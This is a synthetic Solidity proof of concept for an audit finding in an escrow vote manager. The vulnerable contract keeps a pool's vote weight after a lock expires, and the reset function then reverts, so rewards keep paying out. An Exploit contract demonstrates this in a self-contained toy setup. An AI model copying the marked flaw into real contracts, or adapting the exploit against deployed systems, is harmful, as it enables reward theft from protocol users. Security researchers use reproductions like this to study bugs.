// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  EYWA EscrowVoteManagerV1 (MixBytes, Nov 2024, finding #44338).
    SYNTHETIC, cheatcode-free. s_votesByPool is not reduced when the lock
    expires (@> VULN). getVotesByTokenId is 0, so reset hits ZeroEntry and
    the stored 1000 keeps paying the gauge. Live weight would pay 0. */

contract RewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Escrow {
    mapping(uint256 => uint256) public locked;
    mapping(uint256 => uint256) public lockEnd;

    function createLock(uint256 tokenId, uint256 amount, uint256 end) external {
        locked[tokenId] = amount;
        lockEnd[tokenId] = end;
    }

    function getVotesByTokenId(uint256 tokenId) external view returns (uint256) {
        if (block.timestamp >= lockEnd[tokenId]) return 0;
        return locked[tokenId];
    }
}

contract Gauge {}

contract EscrowVoteManager {
    Escrow public immutable escrow;
    RewardToken public immutable reward;
    mapping(address => uint256) public s_votesByPool;
    mapping(uint256 => address) public poolOf;

    error ZeroEntry();

    constructor(Escrow escrow_, RewardToken reward_) {
        escrow = escrow_;
        reward = reward_;
    }

    function vote(address m_pool, uint256 tokenId) external {
        uint256 power = escrow.locked(tokenId);
        if (power == 0) revert ZeroEntry();
        poolOf[tokenId] = m_pool;
        s_votesByPool[m_pool] += power;
    }

    function notifyReward(address m_pool) external {
        uint256 weight = s_votesByPool[m_pool];
        // @> VULN: s_votesByPool[m_pool] is not cleared when the lock expires.
        reward.transfer(m_pool, weight);
    }

    function reset(uint256 tokenId) external {
        uint256 m_votesForPool = escrow.getVotesByTokenId(tokenId);
        if (m_votesForPool == 0) {
            // @> VULN: live votes are 0, so the stored pool weight can never be cleared.
            revert ZeroEntry();
        }
        s_votesByPool[poolOf[tokenId]] = 0;
    }

    function fairWeight(uint256 tokenId) external view returns (uint256) {
        return escrow.getVotesByTokenId(tokenId);
    }
}

contract Exploit {
    RewardToken public reward; // nonce 1
    Escrow public escrow; // nonce 2
    Gauge public gauge; // nonce 3
    EscrowVoteManager public mgr; // nonce 4

    constructor() {
        reward = new RewardToken();
        escrow = new Escrow();
        gauge = new Gauge();
        mgr = new EscrowVoteManager(escrow, reward);
    }

    function run() external {
        escrow.createLock(1, 1000, 0);
        require(escrow.getVotesByTokenId(1) == 0, "lock expired");
        mgr.vote(address(gauge), 1);
        require(mgr.s_votesByPool(address(gauge)) == 1000, "stored weight 1000");
        reward.mint(address(mgr), 1000);
        mgr.notifyReward(address(gauge));
        require(reward.balanceOf(address(gauge)) == 1000, "gauge received 1000");
        require(mgr.fairWeight(1) == 0, "live weight is 0");
        (bool ok,) = address(mgr).call(abi.encodeWithSelector(mgr.reset.selector, uint256(1)));
        require(!ok, "reset reverts");
        require(mgr.s_votesByPool(address(gauge)) == 1000, "weight remains");
    }
}
